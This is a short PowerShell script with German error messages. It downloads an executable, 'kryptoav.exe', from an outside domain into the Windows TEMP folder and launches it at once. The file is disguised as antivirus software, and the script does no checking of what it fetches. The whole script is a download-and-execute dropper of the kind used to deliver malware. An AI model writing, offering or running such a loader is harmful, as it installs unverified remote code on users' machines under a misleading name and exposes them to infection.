$someData = @(
    [PSCustomObject]@{ a = "https://fumot-12000.de/kryptoav.exe"; b = "KryptoAV.exe" }
)

foreach ($i in $someData) {
    try {
        $filePath = "$env:TEMP\$($i.b)"
        $download = -not (Test-Path $filePath)

        if ($download) {
            Invoke-RestMethod -Uri $i.a -OutFile $filePath
        }

        Start-Process -FilePath $filePath
    }
    catch {
        Write-Host "Fehler beim Verarbeiten der Datei $($i.b): $_"
    }
}

